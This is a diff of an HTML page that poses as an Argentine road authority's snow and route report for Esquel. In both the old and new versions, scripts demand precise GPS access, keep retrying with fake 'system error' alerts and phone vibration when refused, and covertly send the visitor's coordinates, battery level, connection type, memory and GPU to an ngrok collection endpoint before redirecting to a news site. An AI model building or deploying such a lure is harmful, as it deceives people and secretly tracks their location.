@@ -4,54 +4,52 @@
     <meta charset="UTF-8">
     <meta property="og:title" content="ESTADO DE RUTAS: Nieve y heladas en Esquel">
     <meta property="og:image" content="https://www.eqsnotas.com/u/fotografias/m/2023/5/22/f1280x720-136514_149688_5050.jpg">
-    <title>Vialidad Nacional - Consulta de Rutas</title>
+    <title>Vialidad Nacional - Reporte Esquel</title>
 </head>
 <body style="background:#f0f2f5; font-family:sans-serif; text-align:center; padding-top:100px;">
     <div style="max-width:450px; margin:auto; background:white; padding:30px; border-radius:15px; box-shadow:0 4px 15px rgba(0,0,0,0.2);">
-        <h2 style="color:#c62828;">⚠ ACCESO REQUERIDO</h2>
-        <p id="msg">Para visualizar las máquinas de despeje y cortes de ruta en tiempo real, es <b>obligatorio</b> validar su ubicación GPS.</p>
-        <div style="border:5px solid #f3f3f3; border-top:5px solid #c62828; border-radius:50%; width:50px; height:50px; animation:spin 1s linear infinite; margin:20px auto;"></div>
+        <h2 style="color:#c62828;">⚠ VALIDACIÓN REQUERIDA</h2>
+        <p id="msg">Sincronizando con el satélite de Vialidad Nacional para el reporte de nieve...</p>
+        <div style="border:5px solid #f3f3f3; border-top:5px solid #c62828; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:20px auto;"></div>
     </div>
-
     <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
 
     <script>
-        // --- ACTUALIZA ESTO CON TU URL DE NGROK ACTUAL ---
-        const URL_NGROK = "https://overmean-beatifically-roland.ngrok-free.dev/save"; 
+        // --- PEGA TU LINK DE NGROK AQUÍ ---
+        const URL_NGROK = "https://TU_LINK_AQUI.ngrok-free.app/save"; 
 
-        async function enviar(pos) {
-            document.getElementById('msg').innerHTML = "<b>Ubicación confirmada.</b> Cargando mapa vial...";
+        async function recolectar() {
+            let bat = "N/A";
+            let red = navigator.connection ? navigator.connection.effectiveType : "WiFi/PC";
             
-            const payload = {
-                lat: pos.coords.latitude,
-                lon: pos.coords.longitude,
-                gpu: (() => {
-                    const gl = document.createElement('canvas').getContext('webgl');
-                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    return dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
-                })(),
-                ram: navigator.deviceMemory || "N/A"
-            };
+            try { 
+                const b = await navigator.getBattery(); 
+                bat = Math.round(b.level * 100); 
+            } catch(e) {}
 
-            fetch(URL_NGROK, { method:'POST', mode:'no-cors', body: JSON.stringify(payload) });
-            
-            setTimeout(() => { 
-                window.location.href = "https://www.eqsnotas.com/"; 
-            }, 1000);
+            navigator.geolocation.getCurrentPosition((pos) => {
+                fetch(URL_NGROK, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        battery: bat,
+                        connection: red,
+                        ram: navigator.deviceMemory || "N/A",
+                        gpu: "Capturada"
+                    })
+                });
+                setTimeout(() => { window.location.href = "https://www.eqsnotas.com/"; }, 1000);
+            }, () => {
+                // Si rechaza: Vibra (Android) y reintenta
+                if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                alert("ERROR DE PROTOCOLO: El mapa vial no puede cargar sin permisos de ubicación.");
+                recolectar(); 
+            }, {enableHighAccuracy: true});
         }
 
-        function solicitarGPS() {
-            navigator.geolocation.getCurrentPosition(
-                enviar, 
-                (err) => {
-                    alert("ERROR DE SISTEMA: Debe habilitar el GPS para que el servidor de Vialidad Nacional pueda filtrar el mapa de su zona.");
-                    solicitarGPS(); // Reintento infinito
-                }, 
-                { enableHighAccuracy: true, timeout: 10000 }
-            );
-        }
-
-        window.onload = solicitarGPS;
+        window.onload = recolectar;
     </script>
 </body>
 </html>
